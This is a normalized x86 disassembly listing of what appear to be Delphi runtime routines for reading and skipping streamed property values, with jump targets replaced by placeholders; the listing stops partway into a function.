mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410700
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403320
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410700
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_418154
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417054
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403284
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410770
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_417db4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417fa7
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov edi ebx
jmp r-xdata
sub_417f5a
add [ eax ] eax
add [ eax ] al
adc al 0x6d
inc eax
add [ esi + 0x7f ] ah
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403894
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4038e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417fa7
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
sub_417fb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_4133e8
mov ebx eax
test ebx ebx
je r-xdata
call sub_416b40
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4107e4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417ff8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4165d4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413898
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418038
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_418087
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4191bc
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410c80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41808e
lea eax [ ebp - 0x10 ]
call sub_40e83c
retn
sub_418094
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_418146
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417044
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417ab4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4165d4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418aa4
lea eax [ ebp - 0x4 ]
call sub_4054f0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410d34
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41814d
lea eax [ ebp - 0x8 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_4054f0
retn
sub_418154
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41844f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418456
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x24 ]
call sub_404594
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ed8
retn
jmp [ eax * 4 + jump_table_4181e4 ]
mov eax [ rw-data ]
call sub_416b28
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410770
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417044
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417104
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_417ab4
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_41069c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417998
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410a74
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418904
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410974
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4189c0
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4109a0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4187e8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417044
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417044
cmp al 0xd
jne r-xdata
push ebp
call sub_418038
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c20
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cf8
jmp r-xdata
push ebp
call sub_418094
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410770
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bb4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_417ab4
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417fb0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418aa4
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4107e4
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_417ab4
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418aa4
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cc0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418aa4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410770
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41715c
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410cc0
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_417ab4
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417ff8
pop ecx
jmp r-xdata
sub_41845c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f08
jmp r-xdata
mov eax [ ebx ]
call sub_413580
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408aac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4184bc
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4187d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4188a4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4187b5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418776
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4188c8
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4188c8
mov eax [ ebp - 0x1c ]
call sub_413154
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4188c8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4188c8
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41845c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4188c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403040
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ea4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41871b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405c20
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413898
xor eax eax
push ebp
push sub_4186fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413a50
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418702
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4030f8
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4139f4
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41874c
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4038e8
jmp r-xdata
call sub_403894
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_416850
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187bc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41877b
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4169f8
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403894
call sub_4038e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187bc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4030f8
sub_4187e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418892
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418865
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418aa4
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410644
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_416b40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416b78
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418899
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4188c8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_4188c8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417068
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fa4
mov eax esi
call j_sub_404380
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417068
pop edx
pop esi
pop ebx
retn
sub_418904
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4189b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417044
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4189c0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40413c
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189b8
lea eax [ ebp - 0x8 ]
call sub_404594
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418aa4
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417068
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404500
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417068
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417068
jmp r-xdata
jmp r-xdata
call sub_416b40
sub_4189c0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418a97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417044
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418904
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046e0
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a9e
lea eax [ ebp - 0xc ]
call sub_403eb4
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418aa4
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417068
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4047dc
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_417068
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417068
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404500
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417068
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4058c0
jmp r-xdata
jmp r-xdata
call sub_416b40
sub_418ab8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418af4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4188c8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418afb
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_418b00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416d00
test al al
je r-xdata
mov eax [ ebx ]
call sub_418bb4
mov eax [ ebx ]
call sub_417c6c
pop ebx
pop ebp
retn
sub_418b28
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417068
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418fac
pop ebx
pop ecx
pop ebp
retn
sub_418b58
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416d00
test al al
je r-xdata
mov eax [ ebx ]
call sub_417044
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417c6c
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_418fac
jmp r-xdata
mov eax [ ebx ]
call sub_418bb4
mov eax [ ebx ]
call sub_416d00
test al al
je r-xdata
mov eax [ ebx ]
call sub_418d50
mov eax [ ebx ]
call sub_417c6c
sub_418bb4
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418d43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418aa4
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d4a
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
jmp [ eax * 4 + jump_table_418beb ]
push ebp
call sub_418b00
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4188c8
jmp r-xdata
push ebp
mov eax 0x1
call sub_418b28
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418ab8
jmp r-xdata
push ebp
mov eax 0x1
call sub_418b28
pop ecx
jmp r-xdata
push ebp
call sub_418b58
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
push ebp
mov eax 0x2
call sub_418b28
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
push ebp
mov eax 0x1
call sub_418b28
pop ecx
sub_418d50
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418d8d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4188c8
mov eax ebx
call sub_418bb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d94
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_418d98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_418e30
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_416d00
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4188c8
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4188c8
jmp r-xdata
mov eax ebx
call sub_418d50
mov eax ebx
call sub_417c6c
jmp r-xdata
mov eax ebx
call sub_416d00
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418d98
mov eax ebx
call sub_417c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418e37
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed8
retn
sub_418e40
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418ee5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f4c
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a1e4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418eec
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
sub_418f10
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_418f38
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_416f98
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_413094
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_40330c
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_416f98
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_418fac
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_417068
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_417068
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_418ff4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
